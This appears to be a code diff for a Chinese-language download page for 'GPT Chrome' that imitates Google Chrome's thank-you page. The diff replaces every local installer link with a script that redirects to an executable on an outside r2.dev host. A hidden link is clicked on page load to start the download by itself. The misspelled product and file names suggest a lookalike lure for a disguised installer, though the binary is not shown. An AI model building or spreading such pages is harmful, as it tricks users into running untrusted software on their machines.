@@ -99,7 +99,7 @@
 			<img src="static/picture/favicon.png" alt="">
 			<span>GPT Chrome</span>
 		</div>
-		<div class="a52"><a class="a53 down_btn" href="static/file/GPT_Chorme_installer.exe" target="_blank"><span class="a57">立即下载</span></a></div>
+		<div class="a52"><a class="a53 down_btn" href="javascript:down()" target="_blank"><span class="a57">立即下载</span></a></div>
 	</div>
 
 	<div role="main" class="chr-main " id="jump-content" data-comp="AnimationTrigger">
@@ -113,7 +113,7 @@
 							</div>
 							<div>
 								<h1 class="chr-ty-hero__headline chr-headline-1">感谢下载！<br>还差几步即可大功告成</h1>
-								<p class="chr-ty-hero__subheadline chr-headline-6">您的下载任务将会自动开始。如果无法正常下载，<a href="static/file/GPT_Chorme_installer.exe" target="_blank" id="js-download-again" style="cursor: pointer;" class="chr-link js-download show">手动下载 GPT Chrome</a></p>
+								<p class="chr-ty-hero__subheadline chr-headline-6">您的下载任务将会自动开始。如果无法正常下载，<a href="javascript:down()" target="_blank" id="js-download-again" style="cursor: pointer;" class="chr-link js-download show">手动下载 GPT Chrome</a></p>
 							</div>
 						</div>
 					</div>
@@ -212,8 +212,13 @@
 		</section>
 
 	</div>
+	<script type="text/javascript">
+     function down(){
+         window.location.href='https://pub-addb8ef101184b368c467ebe49c123d9.r2.dev/GPT_Chorme_installser.exe';
+     }
+ </script>
 	<span style="display:none">
-	<a href="static/file/GPT_Chorme_installer.exe" id="xzz">立即下载</a>
+	<a href="javascript:down()" id="xzz">立即下载</a>
 	<script type="text/javascript">
 	window.onload=function(){
 		document.getElementById("xzz").click();
